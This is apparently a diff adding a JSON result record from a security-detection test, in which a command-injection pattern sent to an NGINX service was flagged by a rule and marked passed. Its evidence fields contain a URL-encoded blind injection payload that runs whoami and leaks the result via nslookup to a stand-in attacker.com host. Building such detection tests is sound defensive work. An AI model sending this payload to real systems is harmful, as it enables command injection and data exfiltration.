@@ -1,0 +1,15 @@
+{
+  "pattern_id": "CMD_BLIND_004",
+  "test_id": "CMD_BLIND_004-1767272395763-p1pd3f",
+  "category": "cmdinj",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 22000,
+  "evidence": "12:59:55.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1767272395763-p1pd3f pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1",
+  "rule_name": "[NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1767272395763-p1pd3f pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1",
+  "expected_rule": "Command Injection via Semicolon",
+  "rule_id": "",
+  "sent_at": 1767272417000,
+  "detected_at": 1767272395000,
+  "status": "passed"
+}
